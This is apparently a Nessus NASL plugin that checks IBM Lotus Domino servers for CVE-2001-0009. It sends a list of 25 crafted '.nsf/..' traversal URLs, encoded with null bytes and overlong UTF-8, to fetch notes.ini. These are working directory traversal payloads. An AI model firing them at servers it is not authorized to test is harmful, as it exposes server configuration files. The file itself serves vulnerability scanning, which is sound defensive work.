#
# Copyright (C) 2000 - 2009 Net-Square Solutions Pvt Ltd.
# By: Hemil Shah
# Desc: This script will check for the notes.ini file in the remote web server.

# Changes by Tenable:
# - Revised plugin title, added VDB refs, replaced bad SF link, changed family, added solution (9/2/09)


include("compat.inc");

if(description)
{
        script_id(12248);
        script_version ("$Revision: 1.13 $");

        script_cve_id("CVE-2001-0009");
        script_bugtraq_id(2173);
        script_osvdb_id(1703);

        script_name(english:"IBM Lotus Domino Server Crafted .nsf Request Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is susceptible to a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"Using a specially crafted request URL containing '.nsf/..', the
installed version of Lotus Domino on the remote host can be abused to
reveal the contents of arbitrary files on the server." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Jan/68" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Jan/148" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 5.0.6a or higher." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/05/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/01/05");
 script_cvs_date("$Date: 2016/10/27 15:14:57 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

        script_summary(english:"notes.ini checker");
        script_category(ACT_ATTACK);
        script_copyright(english:"This script is Copyright (C) 2004-2016 Net-Square Solutions Pvt Ltd.");
        script_family(english:"Web Servers");
        script_dependencie("http_version.nasl");
        script_require_ports("Services/www", 80);
        exit(0);
}



# start script

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(! get_port_state(port))
    exit(0);

if ( get_kb_item("www/no404/" + port ) ) exit(0);

banner = get_http_banner(port:port);
if ( "Domino" >!< banner ) exit(0);

DEBUG = 0;

req = http_get(item:"../../../../whatever.ini", port:port); 
res = http_keepalive_send_recv(port:port, data:req);
if ( res == NULL ) exit(0);

if (ereg(pattern:"^HTTP/[01]\.[01] 200 ", string:res)  ) exit (0);

dirs[0] = "/%00%00.nsf/../lotus/domino/notes.ini";
dirs[1] = "/%00%20.nsf/../lotus/domino/notes.ini";
dirs[2] = "/%00%c0%af.nsf/../lotus/domino/notes.ini";
dirs[3] = "/%00...nsf/../lotus/domino/notes.ini";
dirs[4] = "/%00.nsf//../lotus/domino/notes.ini";
dirs[5] = "/%00.nsf/../lotus/domino/notes.ini";
dirs[6] = "/%00.nsf/..//lotus/domino/notes.ini";
dirs[7] = "/%00.nsf/../../lotus/domino/notes.ini";
dirs[8] = "/%00.nsf.nsf/../lotus/domino/notes.ini";
dirs[9] = "/%20%00.nsf/../lotus/domino/notes.ini";
dirs[10] = "/%20.nsf//../lotus/domino/notes.ini";
dirs[11] = "/%20.nsf/..//lotus/domino/notes.ini";
dirs[12] = "/%c0%af%00.nsf/../lotus/domino/notes.ini";
dirs[13] = "/%c0%af.nsf//../lotus/domino/notes.ini";
dirs[14] = "/%c0%af.nsf/..//lotus/domino/notes.ini";
dirs[15] = "/...nsf//../lotus/domino/notes.ini";
dirs[16] = "/...nsf/..//lotus/domino/notes.ini";
dirs[17] = "/.nsf///../lotus/domino/notes.ini";
dirs[18] = "/.nsf//../lotus/domino/notes.ini";
dirs[19] = "/.nsf//..//lotus/domino/notes.ini";
dirs[20] = "/.nsf/../lotus/domino/notes.ini";
dirs[21] = "/.nsf/../lotus/domino/notes.ini";
dirs[22] = "/.nsf/..///lotus/domino/notes.ini";
dirs[23] = "/.nsf%00.nsf/../lotus/domino/notes.ini";
dirs[24] = "/.nsf.nsf//../lotus/domino/notes.ini";

report = "";


for (i=0; dirs[i]; i++)
{  
	req = http_get(item:dirs[i], port:port); 
	res = http_keepalive_send_recv(port:port, data:req);
	if ( res == NULL ) exit(0);

       
        if(ereg(pattern:"^HTTP/[01]\.[01] 200 ", string:res)  )
        {
	    if ("DEBUG" >< res)
	    {
	    	report = report + string("\nSpecifically, the request for ", dirs[i], " appears\n");
            	report = report + string("to have retrieved the notes.ini file.");
            	security_warning(port:port, extra:report);            
            	exit(0);
	    }
        }
}







